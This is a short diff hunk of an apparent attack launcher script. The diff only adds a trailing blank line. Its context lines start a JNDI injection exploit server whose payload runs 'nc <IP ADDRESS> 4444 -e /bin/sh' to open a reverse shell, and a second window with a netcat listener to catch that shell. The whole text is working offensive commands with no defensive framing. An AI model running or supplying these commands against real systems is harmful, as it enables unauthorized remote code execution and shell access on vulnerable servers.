@@ -4,3 +4,4 @@
 
 xterm -xrm 'XTerm*selectToClipboard: true' -e /bin/bash -c 'java -jar ./JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "nc <IP ADDRESS> 4444 -e /bin/sh" -A <IP ADDRESS>; bash' &
 xterm -xrm 'XTerm*selectToClipboard: true' -e /bin/bash -c "nc -lvnp 4444"
+
